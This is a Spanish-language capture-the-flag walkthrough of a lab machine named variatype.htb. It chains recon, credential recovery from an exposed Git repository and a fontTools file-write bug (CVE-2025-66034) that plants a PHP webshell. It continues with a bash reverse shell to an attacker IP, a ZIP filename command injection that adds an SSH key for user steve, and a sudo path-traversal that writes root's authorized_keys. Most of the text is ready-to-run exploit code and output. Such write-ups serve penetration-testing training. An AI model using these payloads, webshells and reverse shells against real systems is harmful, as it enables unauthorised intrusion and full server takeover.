Escaneamos la IP
```bash
nmap -sV -T4 TU_IP

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 21:00 +0100
Nmap scan report for TU_IP
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
```

Vamos a añadir a nuestro /etc/hosts lo siguiente:
```bash
echo "TU_IP variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```

# Acceso inicial:

Descubrimiento del repositorio Git expuesto
```bash
curl -s http://portal.variatype.htb/.git/HEAD
# ref: refs/heads/master
```
-**Qué hace:**
- Esto Hace una petición HTTP al directorio **/.git/HEAD** del servidor
- En Git, el archivo HEAD siempre existe y contiene la rama actual
- El hecho de que responda con **ref: refs/heads/master** confirma que el directorio .git está completamente expuesto en el servidor web
-**Por qué es grave:**
- Los repositorios Git contienen todo el historial del código fuente
- Un  **.git** expuesto permite descargar el código completo, incluyendo
	- Credenciales hardcodeadas
	- Claves API
	- Contraseñas en commits antiguos
	- Estructura interna de la aplicación

### **Instalación de git-dumper** 
```bash
pip3 install git-dumper --break-system-packages
```
**Qué hace:**
- Instala **git-dumper**, una herramienta especializada para **extraer repositorios Git completos** de servidores mal configurados
- **--break-system-packages** es necesario en sistemas modernos (como Kali) para evitar conflictos con paquetes del sistema

**Cómo funciona git-dumper:**  
No solo descarga archivos sueltos, sino que reconstruye la estructura completa de Git, permitiendo ver el historial de commits, ramas, etc.


### **Dump del repositorio**
```bash
git-dumper http://portal.variatype.htb/.git ./repo
cd repo
```
**Qué hace:**
- Conecta al servidor y descarga **todos los objetos Git** (commits, trees, blobs)
- Reconstruye localmente el repositorio en **./repo**
- Después de esto, tienes una copia local exacta del código fuente

# Recuperar credenciales borradas desde el historial de git
```bash
git log --oneline --all

753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

```bash
git fsck --unreachable --no-reflog | grep commit

Checking ref database: 100% (1/1), listo.
Revisando objetos directorios: 100% (256/256), listo.
inalcanzable commit 6f021da6be7086f2595befaa025a83d1de99478b
```

```bash
git show 6f021da6be7086f2595befaa025a83d1de99478b

commit 6f021da6be7086f2595befaa025a83d1de99478b
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:48 2025 -0500
    security: remove hardcoded credentials
diff --git a/auth.php b/auth.php
index b328305..615e621 100644
--- a/auth.php
+++ b/auth.php
@@ -1,5 +1,3 @@
 <?php
 session_start();
-$USERS = [
-    'gitbot' => 'credenciales ---'
-];
+$USERS = [];
```

Hemos encontrado credenciales en el historial!!!
```txt
gitbot : ---
```

# Login en el portal

Vamos a validar el login en el portal
```bash
curl -s -X POST http://portal.variatype.htb/ \
  -d "username=gitbot" \
  -d 'password=---' \
  -c cookies.txt -L
```
Si nos devuelve "Successfully authenticated", significa que funciona todo correcto!

# RCE - CVE-2025-66034 
Analicemos la vulnerabilidad primero!!!

**Contexto de la vulnerabilidad**  
CVE-2025-66034 afecta a las versiones 4.33.0–4.60.2 de **fontTools**. El módulo **varLib** procesa archivos **.designspace** sin sanitizar el atributo **filename** de los elementos <"variable-font">, lo que permite a un atacante escribir la salida de la fuente compilada en una ruta arbitraria del sistema de archivos.

Combinado con la inyección de XML mediante bloques **CDATA** en los nombres de las etiquetas de los ejes (_axis label names_), el archivo de salida puede contener contenido arbitrario, incluido **código PHP**.

El sitio principal **variatype.htb** exponía un endpoint **Variable Font Generator** que pasaba los archivos subidos directamente a **fontTools** en el lado del servidor.


# Vamos a crear los TTF
fontTools requiere archivos TTF válidos. Generamos las fuentes válidas más pequeñas posibles:
```python
# make_fonts.py
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def build(name, weight):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    p = TTGlyphPen(None)
    p.moveTo((0,0)); p.lineTo((500,0))
    p.lineTo((500,500)); p.lineTo((0,500)); p.closePath()
    fb.setupGlyf({".notdef": p.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": "W"})
    fb.save(name)

build("source-light.ttf", 100)
build("source-regular.ttf", 400)
```
Lo ejecutamos
```bash
python3 make_fonts.py
```

# Toca crear el Designspace malicioso

La webshell PHP se inyecta en el <"labelname"> del eje mediante un bloque CDATA.
El filename de salida se establece en una ruta servida por PHP en el vhost del portal.

Se utiliza __halt_compiler() para evitar que PHP falle al interpretar los datos binarios TTF que aparecen después del código inyectado:

```designspace
<!-- malicious3.designspace -->
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); __halt_compiler(); ?>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont"
      filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```



# Ahora vamos a subirlos y vamos a probar

```bash
curl -s -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@malicious3.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf"
```

Si el proceso esta OK, nos devolverá un OUTPUT positivo!

Vamos a verificar el RCE
```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id" \
  --output - | strings | tail -3
  
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Para sacar Reverse Shell hacemos lo siguiente:
```bash
#Terminal 1
nc -lvnp 4444

#Terminal 2
curl -s "http://portal.variatype.htb/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'" --output -
```


# Vamos a escalar al usuario "Steve"

```bash
#Maquina atacante
ssh-keygen -t ed25519 -f ./steve_key -N "" -C "pwn"
```

```python
# make_zip.py
import zipfile

pub = open("steve_key.pub").read().strip()

cmd = (
    f'x$(mkdir -p /home/steve/.ssh && '
    f'echo "{pub}" >> /home/steve/.ssh/authorized_keys && '
    f'chmod 700 /home/steve/.ssh && '
    f'chmod 600 /home/steve/.ssh/authorized_keys).ttf'
)

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr(cmd, b"\x00" * 64)

print(f"[+] evil.zip created  (payload length: {len(cmd)})")
```

```bash
python3 make_zip.py 
# [+] evil.zip created (payload length: 240)
```


# Lo mandaremos a través de Webshell

Empezamos un http server en www-data
```bash
#Maquina atacada
python3 -m http.server 8888
```

Y lo enviamos desde nuestra maquina
```bash
#Maquina atacante
curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget+http://TU_IP:8888/evil.zip+-O+/var/www/portal.variatype.htb/public/files/evil.zip" \ --output - | strings | tail -3
```

Verificamos que esta dentro
```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=ls+-la+/var/www/portal.variatype.htb/public/files/" \ --output - | strings | tail -5

ls -l
-rw-r--r-- 1 www-data  www-data  642 Mar 15 01:33 evil.zip
-rw-r--r-- 1 variatype www-data  936 Mar 15 01:30 shell.php

#Maquina atacante
ssh -i steve_key -o StrictHostKeyChecking=no steve@10.129.7.246 "id && cat ~/user.txt"
```

Hacemos desde nuestra maquina SSH al server con el user steve
```bash
ssh -i steve_key steve@IP_SERVER
cat user.txt
*********26a57day76ar1********
sudo -l
User steve may run the following commands on variatype: (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Steven puede usar **install_validator.py**

# Explotacion Final

```bash
#Maquina atacante:
ssh-keygen -t ed25519 -f ./root_key -N "" -C "r00t"
```
```python
# serve.py
from http.server import HTTPServer, BaseHTTPRequestHandler

key = open("root_key.pub", "rb").read()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(key)))
        self.end_headers()
        self.wfile.write(key)
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8889), H).serve_forever()
```
```bash
python3 serve.py &
```

```bash
ssh -i steve_key -o StrictHostKeyChecking=no steve@10.129.13.145 "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.14.210:8889/%2Froot%2F.ssh%2Fauthorized_keys'"

2026-03-16 19:39:05,110 [INFO] Attempting to install plugin from: http://10.10.14.210:8889/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-16 19:39:05,121 [INFO] Downloading http://10.10.14.210:8889/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-16 19:39:05,208 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

```bash
ssh -i root_key -o StrictHostKeyChecking=no root@10.129.13.145 "id && cat /root/root.txt"

uid=0(root) gid=0(root) groups=0(root) 
ead***********************************
```

# Organización del ataque:

```txt
[Recon]
  nmap → ports 22, 80 → vhosts: variatype.htb, portal.variatype.htb
        ↓
[Git Exposure]
  portal.variatype.htb/.git exposed
  → git-dumper → git fsck unreachable commits
  → gitbot : ---
        ↓
[CVE-2025-66034 - fontTools XML Injection + Arbitrary File Write]
  Craft .designspace with PHP payload in CDATA label
  → POST /tools/variable-font-generator/process
  → shell.php written to /var/www/portal.variatype.htb/public/files/
  → RCE as www-data
        ↓
[CVE-2024-25082 - FontForge ZIP Filename Command Injection]
  Embed SSH key injection in ZIP entry filename
  → wget evil.zip via webshell
  → FontForge cron processes ZIP as steve
  → SSH key injected into /home/steve/.ssh/authorized_keys
  → SSH as steve → user.txt ✅
        ↓
[Path Traversal - install_validator.py sudo NOPASSWD]
  URL-encode / as %2F to bypass path restriction
  → sudo install_validator.py 'http://attacker/%2Froot%2F.ssh%2Fauthorized_keys'
  → root_key.pub written to /root/.ssh/authorized_keys
  → SSH as root → root.txt ✅
```








